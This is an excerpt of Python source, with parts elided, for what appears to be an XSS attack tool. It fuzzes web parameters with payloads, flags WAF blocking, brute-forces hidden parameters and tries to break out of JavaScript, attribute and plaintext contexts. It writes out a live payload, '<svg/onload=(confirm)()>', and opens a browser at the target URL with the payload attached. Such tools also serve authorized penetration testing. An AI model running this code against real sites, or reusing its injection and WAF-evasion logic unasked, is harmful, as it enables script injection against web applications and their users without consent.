...
# Banner
print(
    """  %s____  ___  _________ _________ __          __ __           
...
def fuzzer(url, param_data, GET, POST):
    ...
    for i in fuzzes:
        ...
        sleep(
            delay
        )  # Pausing the program. Default = 0 sec. In case of WAF = 6 sec. # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
        sys.stdout.write("\r%s Fuzz Sent: %i/%i" % (run, progress, len(fuzzes)))
        sys.stdout.flush()
        try:
            fuzzy = quote_plus(i)  # URL encoding the payload
            param_data_injected = param_data.replace(
                xsschecker, fuzzy
            )  # Replcaing the xsschecker with fuzz
            if GET:  # GET parameter
                response = br.open(
                    url + param_data_injected
                ).read()  # makes a request to example.com/search.php?q=<fuzz>
            else:  # POST parameter
                response = br.open(
                    url, param_data_injected
                ).read()  # Seperating the "param_data_injected" with comma because its POST data
            if (
                i in response
            ):  # if fuzz string is reflected in the response / source code
                result.append({"result": "%sWorks%s" % (green, end), "fuzz": i})
            else:  # if the fuzz string was not reflected in the response completely
                result.append({"result": "%sFiltered%s" % (yellow, end), "fuzz": i})
        except:  # if the server returned an error (Maybe WAF blocked it)
            result.append({"result": "%sBlocked%s" % (red, end), "fuzz": i})
    table = PrettyTable(["Fuzz", "Response"])  # Creates a table with two columns
    for value in result:
        table.add_row(
            [value["fuzz"], value["result"]]
        )  # Adds the value of fuzz and result to the columns
    print("\n", table)
    ...
    try:
        ...
        if (
            ...
            if choice == "y":
                ...
                if GET:
                    webbrowser.open(
                        url + param_data.strip(xsschecker) + "<svg/onload=(confirm)()>"
                    )
                    quit()
            strength = (
        ...
        if efficiency == 100:
            if action == "do":
                ...
                if choice == "y":
                    ...
                    if GET:
                        webbrowser.open(
                            url + param_data.strip(xsschecker) + payload_to_compare
                        )
                        quit()
...
def paramfinder(url, GET, POST):
    ...
    for param in blind_params:
        progress = progress + 1
        sys.stdout.write(
            "\r%s Parameters checked: %i/%i" % (run, progress, len(blind_params))
        )
        sys.stdout.flush()
...
def inject(url, param_data, GET, POST):
    ...
    for OCCURENCE_NUM, location in zip(occur_number, occur_location):
        ...
        if location == "comment":
            ...
            print(
                "%s Trying to break out of %sJavaScript%s context." % (run, green, end)
            )
            prefixes = ["'-", "\\'-", "\\'-"]
            suffixes = ["-'", "-\\'", "//'"]
            progress = 0
            ...
            print(
                "%s Trying to break out of %sPlaintext%s context." % (run, green, end)
            )
            progress = 0
            l_than, g_than = "", ""
            if angular_allowed:
            ...
            print(
                "%s Trying to break out of %sAttribute%s context." % (run, green, end)
            )
